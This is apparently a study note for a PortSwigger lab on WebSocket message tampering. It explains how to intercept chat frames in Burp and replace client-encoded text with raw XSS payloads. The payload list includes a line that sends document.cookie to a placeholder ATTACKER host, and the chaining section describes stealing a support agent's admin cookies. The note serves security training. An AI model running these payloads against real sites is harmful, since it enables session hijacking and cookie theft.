# WebSockets — Message manipulation (XSS via WS)

The client JS sanitizes input before sending (HTML-encodes `<` etc.), but the server reflects the raw WS message back into the page. Intercept the WS message after the client sends it (before the server receives it) and replace the encoded content with a raw XSS payload.

## Quick reference
```
# Burp Proxy → WebSockets history → find your chat message
# Right-click → Intercept WebSocket messages (or send to Repeater)
# Replace message content with:
<img src=1 onerror='alert(1)'>
# → alert fires in your browser AND in the support agent's browser
```

## Root cause
Client-side encoding only (JS escapes before sending). Server receives messages and reflects them into the page HTML without server-side encoding. Bypass client-side sanitization by intercepting the WS frame after the browser serializes it.

## Find it
1. Open "Live chat" → send a message with `<` character.
2. Burp WebSockets history → find the outgoing message → note it's HTML-encoded (`&lt;`).
3. Intercept mode: resend with raw `<img src=1 onerror='alert(1)'>`.
4. If alert fires → server reflects unencoded.

## Technique
1. Enable Burp Proxy intercept for WebSocket messages.
2. Send a chat message — intercept the outgoing WS frame.
3. Edit payload to: `<img src=1 onerror='alert(1)'>`.
4. Forward → alert fires in browser and in support agent's browser.

## Payload arsenal
```
<img src=1 onerror='alert(1)'>
<img src=1 onerror='document.location="https://ATTACKER/steal?c="+document.cookie'>
<svg onload=alert(1)>
```

## Bypasses
| Defense | Bypass |
|---|---|
| Client HTML-encodes before send | Intercept WS frame and replace with raw payload |
| Server strips `<script>` | Use event-handler payloads: `<img onerror>`, `<svg onload>` |

## Exploitation walkthrough
1. Live chat → send `<` → Burp WS history shows `&lt;` encoded.
2. Intercept next message → replace body with `<img src=1 onerror='alert(1)'>` → forward.
3. Alert fires in browser → lab solved.

## Chaining
- XSS in support agent's browser → steal admin cookies → [Authentication](../../Authentication/)
- Combine with [DOM-based-vulnerabilities](../../DOM-based-vulnerabilities/) if WS data flows into DOM sinks

## Tools
- **Burp Proxy WebSockets intercept** — catch and modify WS frames in flight

## Labs

### Manipulating WebSocket messages to exploit vulnerabilities [Apprentice]
Client HTML-encodes chat messages. Intercept WS frame → replace with `<img src=1 onerror='alert(1)'>` → server reflects raw → XSS in both your and support agent's browser. Key insight: client-side encoding is irrelevant when you control the raw WS frame.

## Real-world notes
- Any chat or real-time feature on a page uses WS; the server-side often trusts WS data more than HTTP params.
- Support agent receiving XSS → admin cookie theft is a common high-impact chain.

## References
- https://portswigger.net/web-security/websockets
